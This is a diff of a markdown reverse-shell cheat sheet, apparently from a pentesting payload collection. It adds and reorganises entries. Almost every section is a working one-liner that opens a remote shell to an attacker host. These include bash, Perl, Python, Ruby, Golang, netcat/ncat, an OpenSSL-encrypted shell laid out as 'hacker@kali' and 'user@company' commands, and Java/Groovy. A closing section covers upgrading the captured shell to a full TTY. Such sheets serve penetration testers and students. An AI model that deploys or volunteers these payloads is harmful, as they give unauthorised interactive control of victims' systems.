@@ -1,6 +1,30 @@
-# Reverse Shell Methods
+# Reverse Shell Cheat Sheet
 
-## Reverse Shell Cheat Sheet
+## Summary
+
+* [Reverse Shell](#reverse-shell)
+    * [Bash TCP](#bash-tcp)
+    * [Bash UDP](#bash-udp)
+    * [Perl](#perl)
+    * [Python](#python)
+    * [PHP](#php)
+    * [Ruby](#ruby)
+    * [Golang](#golang)
+    * [Netcat Traditional](#netcat-traditional)
+    * [Netcat OpenBsd](#netcat-openbsd)
+    * [Ncat](#ncat)
+    * [OpenSSL](#openssl)
+    * [Powershell](#powershell)
+    * [Awk](#awk)
+    * [Java](#java)
+    * [War](#war)
+    * [Lua](#lua)
+    * [NodeJS](#nodejs)
+    * [Groovy](#groovy)
+* [Spawn TTY Shell](#spawn-tty-shell)
+* [References](#references)
+
+## Reverse Shell
 
 ### Bash TCP
 
@@ -35,6 +59,11 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen(
 ### Python
 
 Linux only
+
+IPv4
+```python
+export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
 
 IPv4
 ```python
@@ -73,6 +102,12 @@ NOTE: Windows only
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
+### Golang
+
+```bash
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+```
+
 ### Netcat Traditional
 
 ```bash
@@ -90,6 +125,17 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```bash
 ncat 127.0.0.1 4444 -e /bin/bash
 ncat --udp 127.0.0.1 4444 -e /bin/bash
+```
+
+### OpenSSL
+
+```powershell
+hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+hacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+or
+hacker@kali$ ncat --ssl -vv -l -p 4242
+
+user@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:4242 > /tmp/s; rm /tmp/s
 ```
 
 ### Powershell
@@ -173,8 +219,9 @@ or
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
-### Groovy - by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+### Groovy
 
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 NOTE: Java reverse shell also work for Groovy
 
 ```javascript
@@ -184,15 +231,41 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## Spawn TTY
+## Spawn TTY Shell
 
-```bash
-/bin/sh -i
-```
+Access shortcuts, su, nano and autocomplete in a partially tty shell
 
-(From an interpreter)
+/!\ OhMyZSH might break this trick, a simple `sh` is recommended
+
+> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect
 
 ```powershell
+ctrl+z
+echo $TERM && tput lines && tput cols
+
+# for bash
+stty raw -echo
+fg
+
+# for zsh
+stty raw -echo; fg
+
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols>
+```
+
+or use `socat` binary to get a fully tty reverse shell
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:12345
+```
+
+Spawn a TTY shell from an interpreter
+
+```powershell
+/bin/sh -i
 python -c 'import pty; pty.spawn("/bin/sh")'
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
@@ -200,34 +273,6 @@ ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
 
-Access shortcuts, su, nano and autocomplete in a partially tty shell
-/!\ OhMyZSH might break this trick, a simple `sh` is recommended
-
-```powershell
-# in host
-ctrl+z
-stty raw -echo
-fg
-
-# in reverse shell
-reset
-export SHELL=bash
-export TERM=xterm-256color
-stty rows <num> columns <cols>
-```
-
-(From within vi)
-
-```bash
-:!bash
-:set shell=/bin/bash:shell
-```
-
-(From within nmap)
-
-```sh
-!sh
-```
 
 ## References
 
